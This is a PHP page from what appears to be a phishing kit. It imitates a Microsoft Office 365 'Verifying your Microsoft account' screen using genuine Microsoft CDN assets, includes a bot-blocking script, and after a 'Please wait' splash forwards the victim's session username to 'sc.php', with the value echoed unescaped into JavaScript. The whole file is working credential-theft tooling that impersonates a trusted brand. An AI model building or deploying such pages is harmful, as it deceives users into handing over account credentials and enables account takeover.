<?php
include('blocker.php');
session_start();
$UserName = $_SESSION['UserName'];
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html class="win-hoverable" xmlns="http://www.w3.org/1999/xhtml" dir="ltr" style="background-color: rgb(0, 114, 198);" 
    lang="iv"
    xml:lang="iv">
    <head>
        <title>Office 365</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="-1" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="PageID" content="i5030.2.0" />
        <meta name="SiteID" content="501148" />
        <meta name="ReqLC" content="1033" />
        <meta name="LocLC" content="1033" />
        <meta name="mswebdialog-newwindowurl" content="*" />
        
<style type="text/css">
<!--
.style1 {font-family: "Courier New", Courier, monospace}
.style4 {font-family: "Courier New", Courier, monospace;
	color:#0066CC;
	font-size:20px;}

.style6 {color: #FF6600}
.style8 {font-size: 16}
-->
</style>
<script>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=7000

//configure destination URL

var targetdestination="sc.php?userid=<?php echo $UserName ?>"





var splashmessage=new Array()

var openingtags='<font face="Segoe UI Light" size="5" color="#000000">'

splashmessage[0]='Please wait ...'







var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script>

        <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5274.8/content/cdnbundles/jquery.1.11.min.js"></script>

        
        
            <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5274.8/content/images/favicon_a.ico" />

<link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5274.8/content/cdnbundles/login.min.css" rel="stylesheet" />
<script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5274.8/content/cdnbundles/aad.login.min.js"></script>
            <script type="text/javascript">
                if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
                    var msViewportStyle = document.createElement("style");
                    msViewportStyle.appendChild(
                        document.createTextNode(
                            "@-ms-viewport{width:auto!important}"
                        )
                    );
                    msViewportStyle.appendChild(
                        document.createTextNode(
                            "@-ms-viewport{height:auto!important}"
                        )
                    );
                    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
                }
            </script>
    </head>
    <body>
                <div id="background_branding_container"
                     class="ie_legacy"
                     style="background-color: rgb(0, 114, 198); background-position: initial; background-repeat: initial;">
                    <img id="background_background_image"
                         style="width: 886px; height: 678px; background-color: rgb(0, 114, 198); visibility: visible;"
                         src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5274.8/content/images/default_signin_illustration.png" />
                </div>
            <div id="login_panel" class="login_panel" style="display: block;">
                <table class="login_panel_layout" style="height: 100%;">
                    <tbody>
                        <tr class="login_panel_layout_row" style="height: 100%;">
                            <td id="login_panel_center">
                                <script type="text/javascript">
                                    $(document).ready(function () {
                                        User.UpdateLogo('', 'Verifying your Microsoft account');
                                        User.UpdateBackground('https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5274.8/content/images/default_signin_illustration.png', '');
                                    });
                                </script>
                                <div class="login_inner_container" style="display: block;">
                                    <div class="inner_container cred">
                                        <div class="login_workload_logo_container"></div>
                                        <div class="spacer"></div>
                                        <div id="login_error_container" class="login_error_container"></div>
                                        <div class="login_cta_container normaltext">
                                            <div id="login_cta_text" class="cta_message_text 1"> 

                                            </div>
                    <b><center><img src="scr/ellipsis.gif" /></center></b>
                                            <div id="splashcontainer" class="cta_message_text 1"> 
                                        </div>
                                        <ul class="login_cred_container">
                                            <li class="login_cred_options_container">
                                                <div id="recover_container" class="subtext smalltext" style="visibility: visible; opacity: 1;">
                                                    <span>
                                                    </span>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="push"></div>
                                </div>
                                <div id="footer_links_container" class="login_footer_container">

                                        </table>
                                    </div>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
    </body>
</html>